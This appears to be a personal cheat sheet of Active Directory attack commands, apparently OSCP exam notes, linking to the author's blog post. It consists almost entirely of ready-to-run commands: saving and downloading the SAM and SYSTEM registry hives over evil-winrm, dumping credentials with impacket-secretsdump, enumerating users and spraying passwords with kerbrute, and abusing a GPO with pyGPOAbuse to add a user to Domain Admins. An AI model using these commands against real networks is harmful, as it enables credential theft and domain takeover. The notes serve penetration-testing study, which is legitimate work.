# AD attacks

## Credfiles
Could be in the xxmap folder, dump SAM, a sql data base, look for everything!
```
UnattendedInstallFiles --> check for this with PowerUp
```
Example:
```
C:\Windows\Panther\unattend.xml
C:\Windows\System32\sysprep\sysprep.xml
```
With evil-winrm
```
reg save HKLM\SAM C:\users\administrator\Desktop\sam
reg save HKLM\SYSTEM C:\users\administrator\Desktop\system

download sam
download system
```
Then run impacket secertdumps:
```
impacket-secretsdump -sam sam -system system LOCAL
```


## Tools
https://www.kali.org/tools/kerberoast/

## Kerbrute Install and Use
### Install
```
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
```
```
mv kerbrute_linux_amd64 kerbrute
```
```
chmod +x kerbrute
```
```
sudo mv kerbrute /usr/local/bin/
```
### Use
```
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```
```
kerbrute passwordspray -d domain.local users.txt Password123
```
## PyGPOAbuse
```
git clone https://github.com/Hackndo/pyGPOAbuse
```

```
python3 pygpoabuse.py 'domain.com/user:password' \
-gpo-id 'SID' \
-taskname 'webdev_disable' \
-dc-ip $target \
-powershell 'net group "Domain Admins" User /add'
```

## Links
I go over it in more detail in a blog post:

https://medium.com/@aaronashley466/oscp-notes-active-directory-and-pivoting-cheat-sheet-af42c46fd67b
